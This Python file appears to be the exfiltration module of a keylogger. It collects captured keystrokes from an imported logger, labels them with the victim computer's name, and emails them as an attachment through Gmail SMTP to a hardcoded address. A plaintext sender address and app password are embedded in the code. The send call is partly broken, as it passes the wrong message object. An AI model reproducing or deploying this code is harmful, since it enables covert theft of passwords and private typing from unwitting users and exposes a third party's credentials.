import smtplib
from email.mime.text import MIMEText
from os import *
import keylogger as logger
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


def send_email(msg):
    # setting mime
    sender_email = "ritikkumar9g@gmail.com"
    password = "pggi rlet jaun kyed"
    receiver_email = "ritikkumar3g@gmail.com"

    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    password = password
    message['Subject'] = f'keys from {environ["COMPUTERNAME"]}'

    # settin message

    message.attach(MIMEText(f'{message["subject"]} are located in this file: ', 'plain'))
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload(logger.get_keys_rb())
    encoders.encode_base64(payload)
    payload.add_header('content-Disposition', 'attachment', filename='data.text')
    message.attach(payload)

    # sending email
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.login(message['From'], password)
    server.sendmail(message['From'], message['To'], msg)
    server.quit()
    logger.main()
